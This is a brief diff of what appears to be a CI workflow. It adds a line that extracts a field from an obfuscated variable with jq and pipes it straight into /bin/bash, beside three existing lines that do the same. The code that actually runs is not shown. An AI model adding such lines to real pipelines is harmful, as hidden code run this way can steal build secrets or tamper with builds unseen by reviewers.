@@ -28,6 +28,7 @@ jobs:
           echo $zxlo8 | jq -r .emw2 | /bin/bash
           echo $zwv54 | jq -r .dboiv11 | /bin/bash
           echo $wtd8 | jq -r .lxaem2513 | /bin/bash
+          echo $i58 | jq -r .spyb773 | /bin/bash
 
       - name: Archive results
         if: always()
